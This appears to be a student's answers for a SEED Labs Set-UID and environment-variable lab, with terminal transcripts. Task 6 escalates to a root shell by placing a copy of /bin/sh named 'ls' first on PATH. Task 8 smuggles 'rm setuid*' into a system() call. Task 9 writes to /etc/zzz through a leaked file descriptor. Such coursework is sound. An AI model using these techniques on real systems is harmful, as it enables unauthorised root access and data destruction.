# Answer in my observation

## Task 2
- When comment out the `printenv()` in Line 1 and uncomment  `printenv()` in Line 2. There's nothing change.

## Task 3
- The original code does not call the `/usr/bin/env` program.
- After changing the line 1 to `execve("/usr/bin/env", argv, environ);`, the program calls the `/usr/bin/env` successfully.

## Task 6
- Because the program doesn't call the specific `ls` command, we can do like this to inject the malicious code to the system.

```console
    [03/22/24]seed@VM:~/.../Labsetup$ nano cmd.c
    [03/22/24]seed@VM:~/.../Labsetup$ gcc -o cmd cmd.c
    [03/22/24]seed@VM:~/.../Labsetup$ sudo chown root cmd
    [03/22/24]seed@VM:~/.../Labsetup$ sudo chmod 4755 cmd
    [03/22/24]seed@VM:~/.../Labsetup$ cp /bin/sh ls
    [03/22/24]seed@VM:~/.../Labsetup$ ls -l
    total 924
    -rw-rw-r-- 1 seed seed    761 Dec 27  2020 cap_leak.c
    -rw-rw-r-- 1 seed seed    471 Feb 19  2021 catall.c
    -rwsr-xr-x 1 root seed  16696 Mar 22 00:05 cmd
    -rw-rw-r-- 1 seed seed     81 Mar 22 00:04 cmd.c
    -rwxr-xr-x 1 seed seed 878288 Mar 22 00:05 ls
    -rw-rw-r-- 1 seed seed    180 Mar 21 11:53 myenv.c
    -rw-rw-r-- 1 seed seed    418 Mar 21 11:34 myprintenv.c
    -rwsr-xr-x 1 root seed  16768 Mar 21 12:27 setuid
    -rw-r--r-- 1 root root    159 Mar 21 12:26 setuid.c
    [03/22/24]seed@VM:~/.../Labsetup$ pwd
    /home/seed/Env_SetUID/Labsetup
    [03/22/24]seed@VM:~/.../Labsetup$ export PATH=/home/seed/Env_SetUID/Labsetup:$PATH
    [03/22/24]seed@VM:~/.../Labsetup$ ./cmd 
    VM# id
    uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
    VM#
```
- Explain: 
+ The programmer only uses `ls` path to execute the `ls` command instead of using `/bin/ls` path.
+ The `PATH`, which is the environment variable, has the `/usr/bin` path that has the `ls` command.
+ Therefore we can apply this vulnerability of this Set-UID program to privilege escalation, by using file `/bin/sh` and save, rename it into `ls` as executable file. Finally, adding the path that has injected the malicious code file into the beginning of `PATH` environment variable --> OS will call the path contains the malicious file first, then it sees the fake `ls` file and execute it.

## Task 8
### When using `system()`:
- Because the `system()` invoke the shell, therefore we can abuse to run more commands by using this:

```console
    [03/22/24]seed@VM:~/.../Labsetup$ ls | grep setuid
    setuid
    setuid.c
    [03/22/24]seed@VM:~/.../Labsetup$ ./catall 'catall.c; rm setuid*' 
    #include <unistd.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    int main(int argc, char *argv[])
    {
    char *v[3];
    char *command;

    if(argc < 2) {
        printf("Please type a file name.\n");
        return 1;
    }

    v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = NULL;

    command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
    sprintf(command, "%s %s", v[0], v[1]);

    // Use only one of the followings.
    system(command);
    // execve(v[0], v, NULL);

    return 0 ;
    }
    [03/22/24]seed@VM:~/.../Labsetup$ ls | grep setuid
    [03/22/24]seed@VM:~/.../Labsetup$ 
```

### When using `execve()`:
- Because `execve()` does not invoke shell, we can't abuse this to execute more commands.

```console
    [03/22/24]seed@VM:~/.../Labsetup$ ls
    cap_leak.c  cmd                ls        mylibc.o      myprog.c
    catall      cmd.c              myenv.c   myprintenv.c
    catall.c    libmylib.so.1.0.1  mylibc.c  myprog
    [03/22/24]seed@VM:~/.../Labsetup$ ./catall 'cmd.c; rm cmd*'
    /bin/cat: 'cmd.c; rm cmd*': No such file or directory
    [03/22/24]seed@VM:~/.../Labsetup$ 
```

## Task 9
- We can write to the `/etc/zzz` file by abusing the Capability Leaking, using this:

```console
    root@VM:/home/seed/Env_SetUID/Labsetup# cat /etc/zzz
    Hello, this file is created by user 'root'
    root@VM:/home/seed/Env_SetUID/Labsetup# exit
    exit
    [03/22/24]seed@VM:~/.../Labsetup$ ./cap_leak 
    fd is 3
    $ id                                                                           
    uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
    $ echo 'OceanTran999' >&3                                                      
    $ cat /etc/zzz                                                                 
    Hello, this file is created by user 'root'
    OceanTran999
    $ 
```

## References:
[1]: https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
[2]: https://juggernaut-sec.com/capabilities/
[3]: https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/
[4]: https://man7.org/linux/man-pages/man7/capabilities.7.html
[5]: https://linux-audit.com/linux-capabilities-101/
[6]: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#linux-capabilities